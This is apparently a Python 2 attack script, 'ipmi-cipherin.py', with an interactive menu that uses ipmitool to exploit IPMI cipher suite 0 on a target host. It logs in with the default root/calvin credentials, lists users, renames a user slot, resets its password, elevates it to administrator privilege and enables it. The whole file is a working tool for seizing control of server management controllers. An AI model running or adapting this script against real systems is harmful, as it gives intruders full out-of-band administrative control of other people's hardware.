#!/usr/bin/python

import sys
import subprocess
import os

#argument check
if(len(sys.argv) < 2):
	print "ipmi-cipherin.py <host-IP>"
	sys.exit(2)
else:
	#get IP
	ip = sys.argv[1]

user = "root"

##FUNCTIONS
def findUser():
        os.system('clear')
	p = subprocess.Popen(["./usr/bin/ipmitool","-I","lanplus","-C","0","-H",ip,"-U",user,"-P","calvin","user","list"], stdout=subprocess.PIPE)
        result, err = p.communicate()
        print result
        return

def changeUser(tmpuser):
	global user
	os.system('clear')
        p = subprocess.Popen(["./usr/bin/ipmitool","-I","lanplus","-C","0","-H",ip,"-U",user,"-P","calvin","user","set","name","2",tmpuser], stdout=subprocess.PIPE)
        result, err = p.communicate()
        print result
	user = tmpuser
        return

def changePass(password):
        os.system('clear')
        p = subprocess.Popen(["./usr/bin/ipmitool","-I","lanplus","-C","0","-H",ip,"-U",user,"-P","calvin","user","set","password","2",password], stdout=subprocess.PIPE)
        result, err = p.communicate()
        print result
	p = subprocess.Popen(["./usr/bin/ipmitool","-I","lanplus","-C","0","-H",ip,"-U",user,"-P","calvin","user","priv","2","4"], stdout=subprocess.PIPE)
        result, err = p.communicate()
        print result
	p = subprocess.Popen(["./usr/bin/ipmitool","-I","lanplus","-C","0","-H",ip,"-U",user,"-P","calvin","user","enable","2"], stdout=subprocess.PIPE)
        result, err = p.communicate()
        print result
        return


#MAIN
os.system('clear')
while True:
	print (30 * '-')
	print (" IMPI-CIPHERIN")
	print (30 * '-')
	print ("1. Show full user list")
	print ("2. Change password and elevate")
	print ("3. Change username")
	print ("4. EXIT")
	print (30 * '-') 
	print ("Current user set to: " + user)
	print (30 * '-')
	choice = raw_input('Enter your choice [1-4] : ')
	choice = int(choice)
	if choice == 1:
		findUser()
	elif choice == 2:
        	password = raw_input('New password: ')
		changePass(password)
	elif choice == 3:
        	tmpuser = raw_input('New username: ')
		changeUser(tmpuser)
	elif choice == 4:
		break
	else: 
        	print ("Invalid number. Try again...")
